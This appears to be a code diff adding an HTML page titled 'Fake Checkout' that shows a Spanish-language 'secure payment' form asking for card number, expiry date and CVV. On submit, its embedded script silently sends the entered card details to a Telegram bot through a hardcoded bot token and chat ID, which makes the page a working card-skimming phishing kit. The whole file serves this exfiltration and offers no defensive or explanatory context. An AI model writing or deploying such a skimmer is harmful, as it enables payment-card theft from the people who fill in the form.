@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Fake Checkout</title>
+</head>
+<body>
+    <h2>Pago Seguro</h2>
+    <form id="checkout-form">
+        <input type="text" name="card" placeholder="Número de tarjeta"><br><br>
+        <input type="text" name="expiry" placeholder="MM/YY"><br><br>
+        <input type="text" name="cvv" placeholder="CVV"><br><br>
+        <button type="submit">Pagar</button>
+    </form>
+
+    <script>
+        const TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
+        const CHAT_ID = '5654253897';
+
+        document.getElementById('checkout-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const card = this.card.value;
+            const expiry = this.expiry.value;
+            const cvv = this.cvv.value;
+
+            const message = `
+💳 *Captura de prueba*
+• Número: ${card}
+• Exp: ${expiry}
+• CVV: ${cvv}
+`;
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        });
+    </script>
+</body>
+</html>
